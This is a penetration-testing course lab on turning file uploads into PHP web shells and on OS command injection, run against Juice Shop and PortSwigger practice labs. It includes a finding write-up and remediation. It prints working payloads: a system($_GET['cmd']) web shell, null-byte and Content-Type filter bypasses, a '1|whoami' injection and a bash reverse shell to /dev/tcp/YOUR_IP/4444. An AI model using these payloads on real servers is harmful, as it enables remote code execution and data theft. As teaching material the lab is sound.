Lab 06: File Upload to Web Shell & Command Injection

Every lab so far stayed inside the web app: the database, the browser, other users' data. Today you break out. You get a file you control to run on the server as code, and from that moment you're not talking to the app anymore, you're running commands on the Linux box underneath it. This is the bridge from "web hacking" to "I have a shell," and the rest of the course lives on the far side of it.

1. How a Web Request Becomes a Shell · foundation

🔥
2017: one unpatched web server, 147 million people

Equifax ran a web app built on Apache Struts. Struts had a flaw (CVE-2017-5638, scored a perfect 10.0) where a crafted HTTP header got interpreted as code and ran on the server. Attackers sent the header, the server ran their commands, and they dropped web shells to keep access. From there they moved through the internal network for over two months and walked out with Social Security numbers and birth dates for about 147 million people.

The patch had been out for two months. The entire breach started the way today's lab does: a web request that the server ran as code instead of just reading.

A web server does two very different things with a file, and the whole lab hangs on the difference. It either sends the bytes (a photo, a PDF) or it runs the file and sends you the output (anything the server treats as code, like a .php script). Upload a cat photo, the server sends the photo. Upload a .php file to a server that runs PHP, and the server runs your code.

SAME SERVER, TWO VERY DIFFERENT OUTCOMES

Static file → bytes

harmless 
GET /uploads/cat.jpg
→ server reads the file off disk
→ sends the raw bytes back
→ nothing runs

Executable file → code

RCE 
GET /uploads/shell.php?cmd=id
→ server hands .php to PHP
→ PHP runs your command on the OS
→ sends the command's output back

That one line, <?php system($_GET['cmd']); ?>, is a web shell. The server runs whatever you put in cmd as an OS command and hands you the result. The entire game is getting that file onto a server that will run it.

🤔 An app lets you upload a profile picture and only checks that the filename ends in an image extension. You upload a file called shell.php. It gets rejected. You rename it shell.jpg and it uploads fine. Can you get code execution now? Write your guess.
Answer

Not with .jpg alone: the server sends it as an image, so your PHP never runs. The job is to get a file that both passes the upload check and still gets run as PHP. The rest of this lab is the handful of tricks that do exactly that: lie about the content type, slip the real extension past a filter, or find a server that never checked.

2. Misconfiguration: The Doors Left Open · recon · identify

Before the upload, the recon. Servers leak backup files, debug endpoints, and whole directory listings because someone shipped a default setting. That's security misconfiguration, OWASP's number two, and it's where you find the way in. Juice Shop is running locally, so look at what it hands out for free.

🟢 Baseline · read what the server gives away

  1. Open http://localhost:3000/ftp. The server hands you a full directory listing, including backup files nobody meant to publish.
  2. Grab a harmless one: http://localhost:3000/ftp/legal.md downloads fine.

bash · the directory listing is wide open, the .bak is almost reachable
$ curl -s http://localhost:3000/ftp | grep -oE 'href="[^"]+"'
href="ftp/coupons_2013.md.bak"
href="ftp/package.json.bak"
href="ftp/suspicious_errors.yml"          # that last name is a hint for later

$ curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/ftp/package.json.bak
403                                        # blocked... but only by the extension check
🤔 The filter only lets .md and .pdf through, and it decides by looking at the end of the filename. You want package.json.bak. How do you make the filename end in .md while the server still opens the .bak? Guess before the reveal.
Answer

A null byte. %2500 decodes to a \0, which old code treats as "end of string." The extension filter reads ...bak%2500.md, sees .md at the end, and allows it. The file system reads up to the null and opens package.json.bak. Two layers disagree about where the filename ends, the same split you used for HTTP parameter pollution in Lab 05.

🟡 Stretch · poison null byte, retrieve the blocked file

$ curl -s http://localhost:3000/ftp/package.json.bak%2500.md | head -3
{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT"              # the backup file, served despite the 403
Other doors Juice Shop leaves open

Check these too, they all answer without a login: /metrics (full Prometheus metrics), /rest/admin/application-configuration (the app's config), and the response headers from curl -I http://localhost:3000 (no Content-Security-Policy at all, which is why the XSS in Lab 04 ran so easily).

None of these is a single dramatic bug. Together they're a map of a server nobody locked down, and that map is how you find the upload field, the admin panel, or the backup with credentials in it.

3. Upload a Web Shell, Run Commands · exploit

Time to cross the line. You'll upload a tiny PHP file through an avatar field, then request it, and the server will run your commands. This one needs a real Apache/PHP server, so it runs on PortSwigger.

Juice Shop runs on Node, which doesn't execute .php files, so you can't get a PHP web shell on it. Its upload bugs are different (the /ftp null-byte you just did, plus an XXE bug). For a real web shell you need a server that runs PHP, which is exactly what these PortSwigger labs give you.

🤔 Reading one file is good. But you want to poke around: id, ls, cat /etc/passwd, whatever you decide after you're in. What would you put in exploit.php so you can send any command you want without re-uploading each time? Guess.
Answer

<?php system($_GET['cmd']); ?>. Now the command lives in the URL, so exploit.php?cmd=id runs id, exploit.php?cmd=ls runs ls, and you never re-upload. That's an interactive web shell, and cmd=id comes back as the web server's own user, www-data.

4. When the Upload Fights Back · exploit

Real apps don't accept exploit.php without a word. They check something. The skill is working out what they check, because it's almost never enough. Two classic checks, two ways through.

🟡 Stretch · the server trusts your Content-Type

This lab rejects your upload unless it looks like an image, by reading the Content-Type header your browser sent. That header is yours to set. Catch the upload in Burp and change one line. 

Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg          # was application/x-php. you just lied, and it believed you.

<?php system($_GET['cmd']); ?>
🎯 Lab: web shell upload via Content-Type restriction bypass

Same lesson as Lab 05's access control: a check that trusts a value the client controls is not a check.

🔴 Going Pro · the server blacklists the extension

Tougher lab: the server blocks the .php extension outright. You've already met the trick that beats this, two sections ago. Work out the filename yourself before you open the lab.

🤔 The upload rejects anything ending in .php, but the server still needs to run your file as PHP. You used a null byte on /ftp earlier. What filename gets past a "no .php" check while still running as PHP?
Answer

exploit.php%00.jpg. The upload filter sees .jpg on the end and allows it; the server strips the null byte and saves exploit.php, which it runs. Same poison null byte, different target. (.phtml and other PHP extensions the blacklist forgot also work on some servers.)

🎯 Lab: web shell upload via obfuscated file extension

5. No Upload Needed: OS Command Injection · exploit

Sometimes you don't need to upload anything. If the app ever passes your input into a shell command (checking stock, pinging a host, resizing an image), you can staple your own command onto the end. Same root cause as every injection bug: your data gets treated as code.

🤔 A stock checker runs a shell command on the server like stock.sh 14 29 from your productId and storeId. You control storeId. What do you send to make it also run whoami?
Answer

1|whoami. The shell runs the first command, and the pipe | sends its output into your second command, so whoami runs and its output comes back in the response. ;, &&, and backticks do similar jobs depending on the shell.

🔴 Going Pro · from one command to a real shell

  1. Solve the injection first: in the stock checker, set storeId to 1|whoami and read the user back out of the response. 🎯 Lab: OS command injection, simple case
  2. One command at a time is clumsy. A pentester upgrades to an interactive reverse shell: the target connects back to you, and you type into a real prompt. Start a listener on your own machine: 
    nc -lvnp 4444
  3. Then inject the payload that calls home (swap in your IP). The target's shell connects back to your listener: 
    bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

That reverse shell is the foothold. It's the exact thing Weeks 7 to 9 start from: you're now a user on the box (usually www-data), and the next job is to become root. A web bug became a Linux login.

The reverse shell won't actually connect on the hosted lab, that's expected

PortSwigger's lab lives in their cloud and can't reach your laptop, so /dev/tcp/YOUR_IP/... has nowhere to call back to. On the hosted lab you read command output in-band (the 1|whoami result in the response). You land a real reverse shell in Week 8 on TryHackMe, where you're on a VPN and the target can actually reach you. Learn the payload now, fire it for real then.

6. Write the Finding · document

This is the most serious finding you've written so far. Full control of the server is about as bad as it gets, so the write-up matters.

📓 FINDING · Unrestricted file upload leading to remote code execution severity: Critical
TitleUnrestricted file upload allows an authenticated user to execute OS commands (RCE)
SeverityCritical · CVSS 9.1 (full command execution on the server as the web user)
Affected endpointAvatar upload (POST .../avatar) and retrieval path (GET /files/avatars/<file>), which executes uploaded .php
Steps to reproduce1. Upload exploit.php containing <?php system($_GET['cmd']); ?> as an avatar. 2. Request GET /files/avatars/exploit.php?cmd=id. 3. The response returns command output running as www-data. Filter variants bypassed via Content-Type: image/jpeg and the exploit.php%00.jpg null byte.
ImpactArbitrary command execution on the host. An attacker can read every file the web user can, pivot to the internal network, and work toward full server takeover. This is how the Equifax-class breaches start.
RemediationValidate the file by its actual content, not its extension or Content-Type. Store uploads outside the web root, or on a path served with execution disabled. Generate a random server-side filename. For command injection: never build shell commands from user input, use parameterized APIs and allow-lists.

Critical, not just High, because it's direct code execution with no further chain needed. Compare Lab 05's access control (High): reading data is bad, running commands is worse.

The fix, side by side

💥 Vulnerable

trusts the filename 
// keep the name the user sent,
// drop it in the web root
move_uploaded_file(
  $tmp,
  "/var/www/uploads/" . $name
);
// .php here will execute

✅ Fixed

content-checked, inert 
// verify real content is an image,
// rename server-side, store where
// nothing can execute
if (!is_real_image($tmp)) reject();
$safe = random_id() . ".jpg";
move_uploaded_file($tmp,
  "/srv/uploads/" . $safe); // no PHP here

The pattern under both this and Lab 05: stop trusting what the client tells you about its own request. The filename, the extension, the Content-Type, the BasketId, they're all attacker input. Decide on the server, from the content, every time.
